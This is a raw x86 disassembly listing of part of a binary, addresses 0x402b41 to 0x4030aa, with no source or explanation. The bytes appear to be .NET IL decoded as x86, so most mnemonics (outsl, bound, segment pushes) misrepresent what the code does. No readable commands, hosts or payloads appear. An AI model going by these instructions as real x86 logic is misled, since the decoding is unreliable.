  402b41:	02 03                	add    (%ebx),%al
  402b43:	25 2d 0c 26 72       	and    $0x72260c2d,%eax
  402b48:	b5 03                	mov    $0x3,%ch
  402b4a:	00 70 73             	add    %dh,0x73(%eax)
  402b4d:	52                   	push   %edx
  402b4e:	00 00                	add    %al,(%eax)
  402b50:	0a 7a 7d             	or     0x7d(%edx),%bh
  402b53:	3d 00 00 04 2a       	cmp    $0x2a040000,%eax
  402b58:	13 30                	adc    (%eax),%esi
  402b5a:	06                   	push   %es
  402b5b:	00 58 00             	add    %bl,0x0(%eax)
  402b5e:	00 00                	add    %al,(%eax)
  402b60:	05 00 00 11 72       	add    $0x72110000,%eax
  402b65:	c3                   	ret
  402b66:	03 00                	add    (%eax),%eax
  402b68:	70 03                	jo     0x402b6d
  402b6a:	28 3b                	sub    %bh,(%ebx)
  402b6c:	00 00                	add    %al,(%eax)
  402b6e:	0a 28                	or     (%eax),%ch
  402b70:	53                   	push   %ebx
  402b71:	00 00                	add    %al,(%eax)
  402b73:	0a 73 33             	or     0x33(%ebx),%dh
  402b76:	00 00                	add    %al,(%eax)
  402b78:	0a 0a                	or     (%edx),%cl
  402b7a:	06                   	push   %es
  402b7b:	72 81                	jb     0x402afe
  402b7d:	00 00                	add    %al,(%eax)
  402b7f:	70 72                	jo     0x402bf3
  402b81:	c5 01                	lds    (%ecx),%eax
  402b83:	00 70 6f             	add    %dh,0x6f(%eax)
  402b86:	34 00                	xor    $0x0,%al
  402b88:	00 0a                	add    %cl,(%edx)
  402b8a:	06                   	push   %es
  402b8b:	72 c5                	jb     0x402b52
  402b8d:	01 00                	add    %eax,(%eax)
  402b8f:	70 72                	jo     0x402c03
  402b91:	d3 03                	roll   %cl,(%ebx)
  402b93:	00 70 28             	add    %dh,0x28(%eax)
  402b96:	54                   	push   %esp
  402b97:	00 00                	add    %al,(%eax)
  402b99:	0a 72 e1             	or     -0x1f(%edx),%dh
  402b9c:	03 00                	add    (%eax),%eax
  402b9e:	70 03                	jo     0x402ba3
  402ba0:	28 55 00             	sub    %dl,0x0(%ebp)
  402ba3:	00 0a                	add    %cl,(%edx)
  402ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba6:	34 00                	xor    $0x0,%al
  402ba8:	00 0a                	add    %cl,(%edx)
  402baa:	02 7b 3d             	add    0x3d(%ebx),%bh
  402bad:	00 00                	add    %al,(%eax)
  402baf:	04 06                	add    $0x6,%al
  402bb1:	6f                   	outsl  %ds:(%esi),(%dx)
  402bb2:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402bb7:	4f                   	dec    %edi
  402bb8:	00 00                	add    %al,(%eax)
  402bba:	06                   	push   %es
  402bbb:	2a 13                	sub    (%ebx),%dl
  402bbd:	30 06                	xor    %al,(%esi)
  402bbf:	00 58 00             	add    %bl,0x0(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	05 00 00 11 72       	add    $0x72110000,%eax
  402bc9:	e9 03 00 70 03       	jmp    0x3b02bd1
  402bce:	28 3b                	sub    %bh,(%ebx)
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	0a 28                	or     (%eax),%ch
  402bd4:	53                   	push   %ebx
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	0a 73 33             	or     0x33(%ebx),%dh
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 0a                	or     (%edx),%cl
  402bde:	06                   	push   %es
  402bdf:	72 81                	jb     0x402b62
  402be1:	00 00                	add    %al,(%eax)
  402be3:	70 72                	jo     0x402c57
  402be5:	8f 00                	pop    (%eax)
  402be7:	00 70 6f             	add    %dh,0x6f(%eax)
  402bea:	34 00                	xor    $0x0,%al
  402bec:	00 0a                	add    %cl,(%edx)
  402bee:	06                   	push   %es
  402bef:	72 9f                	jb     0x402b90
  402bf1:	00 00                	add    %al,(%eax)
  402bf3:	70 72                	jo     0x402c67
  402bf5:	d3 03                	roll   %cl,(%ebx)
  402bf7:	00 70 28             	add    %dh,0x28(%eax)
  402bfa:	54                   	push   %esp
  402bfb:	00 00                	add    %al,(%eax)
  402bfd:	0a 72 e1             	or     -0x1f(%edx),%dh
  402c00:	03 00                	add    (%eax),%eax
  402c02:	70 03                	jo     0x402c07
  402c04:	28 55 00             	sub    %dl,0x0(%ebp)
  402c07:	00 0a                	add    %cl,(%edx)
  402c09:	6f                   	outsl  %ds:(%esi),(%dx)
  402c0a:	34 00                	xor    $0x0,%al
  402c0c:	00 0a                	add    %cl,(%edx)
  402c0e:	02 7b 3d             	add    0x3d(%ebx),%bh
  402c11:	00 00                	add    %al,(%eax)
  402c13:	04 06                	add    $0x6,%al
  402c15:	6f                   	outsl  %ds:(%esi),(%dx)
  402c16:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402c1b:	4f                   	dec    %edi
  402c1c:	00 00                	add    %al,(%eax)
  402c1e:	06                   	push   %es
  402c1f:	2a 13                	sub    (%ebx),%dl
  402c21:	30 06                	xor    %al,(%esi)
  402c23:	00 58 00             	add    %bl,0x0(%eax)
  402c26:	00 00                	add    %al,(%eax)
  402c28:	05 00 00 11 72       	add    $0x72110000,%eax
  402c2d:	fd                   	std
  402c2e:	03 00                	add    (%eax),%eax
  402c30:	70 03                	jo     0x402c35
  402c32:	28 3b                	sub    %bh,(%ebx)
  402c34:	00 00                	add    %al,(%eax)
  402c36:	0a 28                	or     (%eax),%ch
  402c38:	53                   	push   %ebx
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	0a 73 33             	or     0x33(%ebx),%dh
  402c3e:	00 00                	add    %al,(%eax)
  402c40:	0a 0a                	or     (%edx),%cl
  402c42:	06                   	push   %es
  402c43:	72 81                	jb     0x402bc6
  402c45:	00 00                	add    %al,(%eax)
  402c47:	70 72                	jo     0x402cbb
  402c49:	0b 04 00             	or     (%eax,%eax,1),%eax
  402c4c:	70 6f                	jo     0x402cbd
  402c4e:	34 00                	xor    $0x0,%al
  402c50:	00 0a                	add    %cl,(%edx)
  402c52:	06                   	push   %es
  402c53:	72 9f                	jb     0x402bf4
  402c55:	00 00                	add    %al,(%eax)
  402c57:	70 72                	jo     0x402ccb
  402c59:	d3 03                	roll   %cl,(%ebx)
  402c5b:	00 70 28             	add    %dh,0x28(%eax)
  402c5e:	54                   	push   %esp
  402c5f:	00 00                	add    %al,(%eax)
  402c61:	0a 72 e1             	or     -0x1f(%edx),%dh
  402c64:	03 00                	add    (%eax),%eax
  402c66:	70 03                	jo     0x402c6b
  402c68:	28 55 00             	sub    %dl,0x0(%ebp)
  402c6b:	00 0a                	add    %cl,(%edx)
  402c6d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6e:	34 00                	xor    $0x0,%al
  402c70:	00 0a                	add    %cl,(%edx)
  402c72:	02 7b 3d             	add    0x3d(%ebx),%bh
  402c75:	00 00                	add    %al,(%eax)
  402c77:	04 06                	add    $0x6,%al
  402c79:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7a:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402c7f:	4f                   	dec    %edi
  402c80:	00 00                	add    %al,(%eax)
  402c82:	06                   	push   %es
  402c83:	2a 13                	sub    (%ebx),%dl
  402c85:	30 05 00 1b 01 00    	xor    %al,0x11b00
  402c8b:	00 06                	add    %al,(%esi)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	11 03                	adc    %eax,(%ebx)
  402c91:	72 2b                	jb     0x402cbe
  402c93:	04 00                	add    $0x0,%al
  402c95:	70 6f                	jo     0x402d06
  402c97:	5b                   	pop    %ebx
  402c98:	00 00                	add    %al,(%eax)
  402c9a:	0a 0a                	or     (%edx),%cl
  402c9c:	03 72 41             	add    0x41(%edx),%esi
  402c9f:	04 00                	add    $0x0,%al
  402ca1:	70 6f                	jo     0x402d12
  402ca3:	5c                   	pop    %esp
  402ca4:	00 00                	add    %al,(%eax)
  402ca6:	0a 0b                	or     (%ebx),%cl
  402ca8:	03 72 4b             	add    0x4b(%edx),%esi
  402cab:	04 00                	add    $0x0,%al
  402cad:	70 6f                	jo     0x402d1e
  402caf:	5b                   	pop    %ebx
  402cb0:	00 00                	add    %al,(%eax)
  402cb2:	0a 6f 5a             	or     0x5a(%edi),%ch
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	0a 0c 03             	or     (%ebx,%eax,1),%cl
  402cba:	72 55                	jb     0x402d11
  402cbc:	04 00                	add    $0x0,%al
  402cbe:	70 6f                	jo     0x402d2f
  402cc0:	5d                   	pop    %ebp
  402cc1:	00 00                	add    %al,(%eax)
  402cc3:	0a 0d 02 1f 09 8d    	or     0x8d091f02,%cl
  402cc9:	57                   	push   %edi
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	01 25 16 72 6d 04    	add    %esp,0x46d7216
  402cd2:	00 70 a2             	add    %dh,-0x5e(%eax)
  402cd5:	25 17 06 a2 25       	and    $0x25a20617,%eax
  402cda:	18 72 93             	sbb    %dh,-0x6d(%edx)
  402cdd:	04 00                	add    $0x0,%al
  402cdf:	70 a2                	jo     0x402c83
  402ce1:	25 19 28 54 00       	and    $0x542819,%eax
  402ce6:	00 0a                	add    %cl,(%edx)
  402ce8:	a2 25 1a 72 ab       	mov    %al,0xab721a25
  402ced:	04 00                	add    $0x0,%al
  402cef:	70 a2                	jo     0x402c93
  402cf1:	25 1b 28 5e 00       	and    $0x5e281b,%eax
  402cf6:	00 0a                	add    %cl,(%edx)
  402cf8:	a2 25 1c 72 af       	mov    %al,0xaf721c25
  402cfd:	04 00                	add    $0x0,%al
  402cff:	70 a2                	jo     0x402ca3
  402d01:	25 1d 12 03 28       	and    $0x2803121d,%eax
  402d06:	5f                   	pop    %edi
  402d07:	00 00                	add    %al,(%eax)
  402d09:	0a a2 25 1e 72 bb    	or     -0x448de1db(%edx),%ah
  402d0f:	04 00                	add    $0x0,%al
  402d11:	70 a2                	jo     0x402cb5
  402d13:	28 2a                	sub    %ch,(%edx)
  402d15:	00 00                	add    %al,(%eax)
  402d17:	0a 28                	or     (%eax),%ch
  402d19:	2e 00 00             	add    %al,%cs:(%eax)
  402d1c:	06                   	push   %es
  402d1d:	02 7b 40             	add    0x40(%ebx),%bh
  402d20:	00 00                	add    %al,(%eax)
  402d22:	04 06                	add    $0x6,%al
  402d24:	73 60                	jae    0x402d86
  402d26:	00 00                	add    %al,(%eax)
  402d28:	0a 6f 61             	or     0x61(%edi),%ch
  402d2b:	00 00                	add    %al,(%eax)
  402d2d:	0a 02                	or     (%edx),%al
  402d2f:	7b 41                	jnp    0x402d72
  402d31:	00 00                	add    %al,(%eax)
  402d33:	04 06                	add    $0x6,%al
  402d35:	07                   	pop    %es
  402d36:	6f                   	outsl  %ds:(%esi),(%dx)
  402d37:	62 00                	bound  %eax,(%eax)
  402d39:	00 0a                	add    %cl,(%edx)
  402d3b:	02 7b 42             	add    0x42(%ebx),%bh
  402d3e:	00 00                	add    %al,(%eax)
  402d40:	04 06                	add    $0x6,%al
  402d42:	08 6f 63             	or     %ch,0x63(%edi)
  402d45:	00 00                	add    %al,(%eax)
  402d47:	0a 02                	or     (%edx),%al
  402d49:	7b 3a                	jnp    0x402d85
  402d4b:	00 00                	add    %al,(%eax)
  402d4d:	04 06                	add    $0x6,%al
  402d4f:	73 64                	jae    0x402db5
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 6f 65             	or     0x65(%edi),%ch
  402d56:	00 00                	add    %al,(%eax)
  402d58:	0a 02                	or     (%edx),%al
  402d5a:	7b 3b                	jnp    0x402d97
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	04 06                	add    $0x6,%al
  402d60:	09 6f 66             	or     %ebp,0x66(%edi)
  402d63:	00 00                	add    %al,(%eax)
  402d65:	0a 73 33             	or     0x33(%ebx),%dh
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	0a 13                	or     (%ebx),%dl
  402d6c:	04 11                	add    $0x11,%al
  402d6e:	04 72                	add    $0x72,%al
  402d70:	81 00 00 70 72 cb    	addl   $0xcb727000,(%eax)
  402d76:	04 00                	add    $0x0,%al
  402d78:	70 6f                	jo     0x402de9
  402d7a:	34 00                	xor    $0x0,%al
  402d7c:	00 0a                	add    %cl,(%edx)
  402d7e:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402d81:	2b 04 00             	sub    (%eax,%eax,1),%eax
  402d84:	70 06                	jo     0x402d8c
  402d86:	6f                   	outsl  %ds:(%esi),(%dx)
  402d87:	34 00                	xor    $0x0,%al
  402d89:	00 0a                	add    %cl,(%edx)
  402d8b:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402d8e:	e7 04                	out    %eax,$0x4
  402d90:	00 70 15             	add    %dh,0x15(%eax)
  402d93:	6f                   	outsl  %ds:(%esi),(%dx)
  402d94:	67 00 00             	add    %al,(%bx,%si)
  402d97:	0a 02                	or     (%edx),%al
  402d99:	7b 3d                	jnp    0x402dd8
  402d9b:	00 00                	add    %al,(%eax)
  402d9d:	04 11                	add    $0x11,%al
  402d9f:	04 6f                	add    $0x6f,%al
  402da1:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402da6:	4f                   	dec    %edi
  402da7:	00 00                	add    %al,(%eax)
  402da9:	06                   	push   %es
  402daa:	2a 00                	sub    (%eax),%al
  402dac:	13 30                	adc    (%eax),%esi
  402dae:	03 00                	add    (%eax),%eax
  402db0:	9b                   	fwait
  402db1:	00 00                	add    %al,(%eax)
  402db3:	00 07                	add    %al,(%edi)
  402db5:	00 00                	add    %al,(%eax)
  402db7:	11 03                	adc    %eax,(%ebx)
  402db9:	72 2b                	jb     0x402de6
  402dbb:	04 00                	add    $0x0,%al
  402dbd:	70 6f                	jo     0x402e2e
  402dbf:	5b                   	pop    %ebx
  402dc0:	00 00                	add    %al,(%eax)
  402dc2:	0a 0a                	or     (%edx),%cl
  402dc4:	03 72 e7             	add    -0x19(%edx),%esi
  402dc7:	04 00                	add    $0x0,%al
  402dc9:	70 6f                	jo     0x402e3a
  402dcb:	5d                   	pop    %ebp
  402dcc:	00 00                	add    %al,(%eax)
  402dce:	0a 0b                	or     (%ebx),%cl
  402dd0:	03 72 fd             	add    -0x3(%edx),%esi
  402dd3:	04 00                	add    $0x0,%al
  402dd5:	70 6f                	jo     0x402e46
  402dd7:	68 00 00 0a 0c       	push   $0xc0a0000
  402ddc:	02 7b 3a             	add    0x3a(%ebx),%bh
  402ddf:	00 00                	add    %al,(%eax)
  402de1:	04 06                	add    $0x6,%al
  402de3:	6f                   	outsl  %ds:(%esi),(%dx)
  402de4:	69 00 00 0a 2d 01    	imul   $0x12d0a00,(%eax),%eax
  402dea:	2a 02                	sub    (%edx),%al
  402dec:	7b 3a                	jnp    0x402e28
  402dee:	00 00                	add    %al,(%eax)
  402df0:	04 06                	add    $0x6,%al
  402df2:	6f                   	outsl  %ds:(%esi),(%dx)
  402df3:	6a 00                	push   $0x0
  402df5:	00 0a                	add    %cl,(%edx)
  402df7:	07                   	pop    %es
  402df8:	6f                   	outsl  %ds:(%esi),(%dx)
  402df9:	6b 00 00             	imul   $0x0,(%eax),%eax
  402dfc:	0a 2c 01             	or     (%ecx,%eax,1),%ch
  402dff:	2a 02                	sub    (%edx),%al
  402e01:	7b 3a                	jnp    0x402e3d
  402e03:	00 00                	add    %al,(%eax)
  402e05:	04 06                	add    $0x6,%al
  402e07:	6f                   	outsl  %ds:(%esi),(%dx)
  402e08:	6a 00                	push   $0x0
  402e0a:	00 0a                	add    %cl,(%edx)
  402e0c:	07                   	pop    %es
  402e0d:	08 6f 6c             	or     %ch,0x6c(%edi)
  402e10:	00 00                	add    %al,(%eax)
  402e12:	0a 73 33             	or     0x33(%ebx),%dh
  402e15:	00 00                	add    %al,(%eax)
  402e17:	0a 0d 09 72 81 00    	or     0x817209,%cl
  402e1d:	00 70 72             	add    %dh,0x72(%eax)
  402e20:	cb                   	lret
  402e21:	04 00                	add    $0x0,%al
  402e23:	70 6f                	jo     0x402e94
  402e25:	34 00                	xor    $0x0,%al
  402e27:	00 0a                	add    %cl,(%edx)
  402e29:	09 72 2b             	or     %esi,0x2b(%edx)
  402e2c:	04 00                	add    $0x0,%al
  402e2e:	70 06                	jo     0x402e36
  402e30:	6f                   	outsl  %ds:(%esi),(%dx)
  402e31:	34 00                	xor    $0x0,%al
  402e33:	00 0a                	add    %cl,(%edx)
  402e35:	09 72 e7             	or     %esi,-0x19(%edx)
  402e38:	04 00                	add    $0x0,%al
  402e3a:	70 07                	jo     0x402e43
  402e3c:	6f                   	outsl  %ds:(%esi),(%dx)
  402e3d:	67 00 00             	add    %al,(%bx,%si)
  402e40:	0a 02                	or     (%edx),%al
  402e42:	7b 3d                	jnp    0x402e81
  402e44:	00 00                	add    %al,(%eax)
  402e46:	04 09                	add    $0x9,%al
  402e48:	6f                   	outsl  %ds:(%esi),(%dx)
  402e49:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402e4e:	4f                   	dec    %edi
  402e4f:	00 00                	add    %al,(%eax)
  402e51:	06                   	push   %es
  402e52:	2a 00                	sub    (%eax),%al
  402e54:	1b 30                	sbb    (%eax),%esi
  402e56:	06                   	push   %es
  402e57:	00 65 02             	add    %ah,0x2(%ebp)
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	08 00                	or     %al,(%eax)
  402e5e:	00 11                	add    %dl,(%ecx)
  402e60:	03 72 2b             	add    0x2b(%edx),%esi
  402e63:	04 00                	add    $0x0,%al
  402e65:	70 6f                	jo     0x402ed6
  402e67:	5b                   	pop    %ebx
  402e68:	00 00                	add    %al,(%eax)
  402e6a:	0a 0a                	or     (%edx),%cl
  402e6c:	02 7b 3a             	add    0x3a(%ebx),%bh
  402e6f:	00 00                	add    %al,(%eax)
  402e71:	04 06                	add    $0x6,%al
  402e73:	6f                   	outsl  %ds:(%esi),(%dx)
  402e74:	69 00 00 0a 2d 01    	imul   $0x12d0a00,(%eax),%eax
  402e7a:	2a 02                	sub    (%edx),%al
  402e7c:	7b 3b                	jnp    0x402eb9
  402e7e:	00 00                	add    %al,(%eax)
  402e80:	04 06                	add    $0x6,%al
  402e82:	6f                   	outsl  %ds:(%esi),(%dx)
  402e83:	6d                   	insl   (%dx),%es:(%edi)
  402e84:	00 00                	add    %al,(%eax)
  402e86:	0a 0b                	or     (%ebx),%cl
  402e88:	16                   	push   %ss
  402e89:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402e8c:	4a                   	dec    %edx
  402e8d:	02 7b 3a             	add    0x3a(%ebx),%bh
  402e90:	00 00                	add    %al,(%eax)
  402e92:	04 06                	add    $0x6,%al
  402e94:	6f                   	outsl  %ds:(%esi),(%dx)
  402e95:	6a 00                	push   $0x0
  402e97:	00 0a                	add    %cl,(%edx)
  402e99:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402e9c:	6b 00 00             	imul   $0x0,(%eax),%eax
  402e9f:	0a 2d 2f 02 72 07    	or     0x772022f,%ch
  402ea5:	05 00 70 11 04       	add    $0x4117000,%eax
  402eaa:	8c 61 00             	mov    %fs,0x0(%ecx)
  402ead:	00 01                	add    %al,(%ecx)
  402eaf:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402eb3:	0a 28                	or     (%eax),%ch
  402eb5:	5e                   	pop    %esi
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	0a 28                	or     (%eax),%ch
  402eba:	6e                   	outsb  %ds:(%esi),(%dx)
  402ebb:	00 00                	add    %al,(%eax)
  402ebd:	0a 28                	or     (%eax),%ch
  402ebf:	2c 00                	sub    $0x0,%al
  402ec1:	00 06                	add    %al,(%esi)
  402ec3:	02 06                	add    (%esi),%al
  402ec5:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402ec8:	00 06                	add    %al,(%esi)
  402eca:	02 28                	add    (%eax),%ch
  402ecc:	33 00                	xor    (%eax),%eax
  402ece:	00 06                	add    %al,(%esi)
  402ed0:	2a 11                	sub    (%ecx),%dl
  402ed2:	04 17                	add    $0x17,%al
  402ed4:	58                   	pop    %eax
  402ed5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402ed8:	04 07                	add    $0x7,%al
  402eda:	32 b1 73 60 00 00    	xor    0x6073(%ecx),%dh
  402ee0:	0a 13                	or     (%ebx),%dl
  402ee2:	05 16 13 06 2b       	add    $0x2b061316,%eax
  402ee7:	36 11 05 02 7b 3a 00 	adc    %eax,%ss:0x3a7b02
  402eee:	00 04 06             	add    %al,(%esi,%eax,1)
  402ef1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef2:	6a 00                	push   $0x0
  402ef4:	00 0a                	add    %cl,(%edx)
  402ef6:	11 06                	adc    %eax,(%esi)
  402ef8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  402efa:	00 00                	add    %al,(%eax)
  402efc:	0a 16                	or     (%esi),%dl
  402efe:	02 7b 3a             	add    0x3a(%ebx),%bh
  402f01:	00 00                	add    %al,(%eax)
  402f03:	04 06                	add    $0x6,%al
  402f05:	6f                   	outsl  %ds:(%esi),(%dx)
  402f06:	6a 00                	push   $0x0
  402f08:	00 0a                	add    %cl,(%edx)
  402f0a:	11 06                	adc    %eax,(%esi)
  402f0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402f0d:	6f                   	outsl  %ds:(%esi),(%dx)
  402f0e:	00 00                	add    %al,(%eax)
  402f10:	0a 8e 69 6f 70 00    	or     0x706f69(%esi),%cl
  402f16:	00 0a                	add    %cl,(%edx)
  402f18:	11 06                	adc    %eax,(%esi)
  402f1a:	17                   	pop    %ss
  402f1b:	58                   	pop    %eax
  402f1c:	13 06                	adc    (%esi),%eax
  402f1e:	11 06                	adc    %eax,(%esi)
  402f20:	07                   	pop    %es
  402f21:	32 c5                	xor    %ch,%al
  402f23:	11 05 6f 71 00 00    	adc    %eax,0x716f
  402f29:	0a 0c de             	or     (%esi,%ebx,8),%cl
  402f2c:	0c 11                	or     $0x11,%al
  402f2e:	05 2c 07 11 05       	add    $0x511072c,%eax
  402f33:	6f                   	outsl  %ds:(%esi),(%dx)
  402f34:	26 00 00             	add    %al,%es:(%eax)
  402f37:	0a dc                	or     %ah,%bl
  402f39:	08 8e 69 6a 02 7b    	or     %cl,0x7b026a69(%esi)
  402f3f:	41                   	inc    %ecx
  402f40:	00 00                	add    %al,(%eax)
  402f42:	04 06                	add    $0x6,%al
  402f44:	6f                   	outsl  %ds:(%esi),(%dx)
  402f45:	72 00                	jb     0x402f47
  402f47:	00 0a                	add    %cl,(%edx)
  402f49:	2e 37                	cs aaa
  402f4b:	02 72 67             	add    0x67(%edx),%dh
  402f4e:	05 00 70 02 7b       	add    $0x7b027000,%eax
  402f53:	41                   	inc    %ecx
  402f54:	00 00                	add    %al,(%eax)
  402f56:	04 06                	add    $0x6,%al
  402f58:	6f                   	outsl  %ds:(%esi),(%dx)
  402f59:	72 00                	jb     0x402f5b
  402f5b:	00 0a                	add    %cl,(%edx)
  402f5d:	8c 62 00             	mov    %fs,0x0(%edx)
  402f60:	00 01                	add    %al,(%ecx)
  402f62:	08 8e 69 8c 61 00    	or     %cl,0x618c69(%esi)
  402f68:	00 01                	add    %al,(%ecx)
  402f6a:	28 73 00             	sub    %dh,0x0(%ebx)
  402f6d:	00 0a                	add    %cl,(%edx)
  402f6f:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402f72:	00 06                	add    %al,(%esi)
  402f74:	02 06                	add    (%esi),%al
  402f76:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402f79:	00 06                	add    %al,(%esi)
  402f7b:	02 28                	add    (%eax),%ch
  402f7d:	33 00                	xor    (%eax),%eax
  402f7f:	00 06                	add    %al,(%esi)
  402f81:	2a 02                	sub    (%edx),%al
  402f83:	08 28                	or     %ch,(%eax)
  402f85:	2f                   	das
  402f86:	00 00                	add    %al,(%eax)
  402f88:	06                   	push   %es
  402f89:	0d 09 02 7b 42       	or     $0x427b0209,%eax
  402f8e:	00 00                	add    %al,(%eax)
  402f90:	04 06                	add    $0x6,%al
  402f92:	6f                   	outsl  %ds:(%esi),(%dx)
  402f93:	74 00                	je     0x402f95
  402f95:	00 0a                	add    %cl,(%edx)
  402f97:	28 75 00             	sub    %dh,0x0(%ebp)
  402f9a:	00 0a                	add    %cl,(%edx)
  402f9c:	2c 30                	sub    $0x30,%al
  402f9e:	02 72 b1             	add    -0x4f(%edx),%dh
  402fa1:	05 00 70 02 7b       	add    $0x7b027000,%eax
  402fa6:	42                   	inc    %edx
  402fa7:	00 00                	add    %al,(%eax)
  402fa9:	04 06                	add    $0x6,%al
  402fab:	6f                   	outsl  %ds:(%esi),(%dx)
  402fac:	74 00                	je     0x402fae
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	72 e3                	jb     0x402f95
  402fb2:	05 00 70 09 28       	add    $0x28097000,%eax
  402fb7:	55                   	push   %ebp
  402fb8:	00 00                	add    %al,(%eax)
  402fba:	0a 28                	or     (%eax),%ch
  402fbc:	2c 00                	sub    $0x0,%al
  402fbe:	00 06                	add    %al,(%esi)
  402fc0:	02 06                	add    (%esi),%al
  402fc2:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402fc5:	00 06                	add    %al,(%esi)
  402fc7:	02 28                	add    (%eax),%ch
  402fc9:	33 00                	xor    (%eax),%eax
  402fcb:	00 06                	add    %al,(%esi)
  402fcd:	2a 00                	sub    (%eax),%al
  402fcf:	02 08                	add    (%eax),%cl
  402fd1:	28 76 00             	sub    %dh,0x0(%esi)
  402fd4:	00 0a                	add    %cl,(%edx)
  402fd6:	7d 3e                	jge    0x403016
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	04 02                	add    $0x2,%al
  402fdc:	17                   	pop    %ss
  402fdd:	7d 3f                	jge    0x40301e
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	04 de                	add    $0xde,%al
  402fe3:	25 13 07 02 72       	and    $0x72020713,%eax
  402fe8:	f1                   	int1
  402fe9:	05 00 70 11 07       	add    $0x7117000,%eax
  402fee:	6f                   	outsl  %ds:(%esi),(%dx)
  402fef:	77 00                	ja     0x402ff1
  402ff1:	00 0a                	add    %cl,(%edx)
  402ff3:	28 3b                	sub    %bh,(%ebx)
  402ff5:	00 00                	add    %al,(%eax)
  402ff7:	0a 28                	or     (%eax),%ch
  402ff9:	2c 00                	sub    $0x0,%al
  402ffb:	00 06                	add    %al,(%esi)
  402ffd:	02 06                	add    (%esi),%al
  402fff:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403002:	00 06                	add    %al,(%esi)
  403004:	dd bb 00 00 00 00    	fnstsw 0x0(%ebx)
  40300a:	02 7b 3e             	add    0x3e(%ebx),%bh
  40300d:	00 00                	add    %al,(%eax)
  40300f:	04 72                	add    $0x72,%al
  403011:	a0 06 00 70 16       	mov    0x16700006,%al
  403016:	17                   	pop    %ss
  403017:	6f                   	outsl  %ds:(%esi),(%dx)
  403018:	78 00                	js     0x40301a
  40301a:	00 0a                	add    %cl,(%edx)
  40301c:	13 08                	adc    (%eax),%ecx
  40301e:	11 08                	adc    %ecx,(%eax)
  403020:	14 28                	adc    $0x28,%al
  403022:	79 00                	jns    0x403024
  403024:	00 0a                	add    %cl,(%edx)
  403026:	2c 17                	sub    $0x17,%al
  403028:	02 72 c0             	add    -0x40(%edx),%dh
  40302b:	06                   	push   %es
  40302c:	00 70 28             	add    %dh,0x28(%eax)
  40302f:	2c 00                	sub    $0x0,%al
  403031:	00 06                	add    %al,(%esi)
  403033:	02 06                	add    (%esi),%al
  403035:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403038:	00 06                	add    %al,(%esi)
  40303a:	dd 85 00 00 00 02    	fldl   0x2000000(%ebp)
  403040:	7b 3d                	jnp    0x40307f
  403042:	00 00                	add    %al,(%eax)
  403044:	04 73                	add    $0x73,%al
  403046:	0d 00 00 06 13       	or     $0x13060000,%eax
  40304b:	09 11                	or     %edx,(%ecx)
  40304d:	08 72 2c             	or     %dh,0x2c(%edx)
  403050:	07                   	pop    %es
  403051:	00 70 6f             	add    %dh,0x6f(%eax)
  403054:	7a 00                	jp     0x403056
  403056:	00 0a                	add    %cl,(%edx)
  403058:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40305d:	12 14 17             	adc    (%edi,%edx,1),%dl
  403060:	8d 02                	lea    (%edx),%eax
  403062:	00 00                	add    %al,(%eax)
  403064:	01 25 16 11 09 a2    	add    %esp,0xa2091116
  40306a:	28 7b 00             	sub    %bh,0x0(%ebx)
  40306d:	00 0a                	add    %cl,(%edx)
  40306f:	26 11 08             	adc    %ecx,%es:(%eax)
  403072:	72 38                	jb     0x4030ac
  403074:	07                   	pop    %es
  403075:	00 70 6f             	add    %dh,0x6f(%eax)
  403078:	7a 00                	jp     0x40307a
  40307a:	00 0a                	add    %cl,(%edx)
  40307c:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  403081:	12 14 17             	adc    (%edi,%edx,1),%dl
  403084:	8d 02                	lea    (%edx),%eax
  403086:	00 00                	add    %al,(%eax)
  403088:	01 25 16 11 09 a2    	add    %esp,0xa2091116
  40308e:	28 7b 00             	sub    %bh,0x0(%ebx)
  403091:	00 0a                	add    %cl,(%edx)
  403093:	26 02 72 4a          	add    %es:0x4a(%edx),%dh
  403097:	07                   	pop    %es
  403098:	00 70 28             	add    %dh,0x28(%eax)
  40309b:	2d 00 00 06 de       	sub    $0xde060000,%eax
  4030a0:	23 13                	and    (%ebx),%edx
  4030a2:	0a 02                	or     (%edx),%al
  4030a4:	72 a8                	jb     0x40304e
  4030a6:	07                   	pop    %es
  4030a7:	00 70 11             	add    %dh,0x11(%eax)
  4030aa:	0a 6f 77             	or     0x77(%edi),%ch
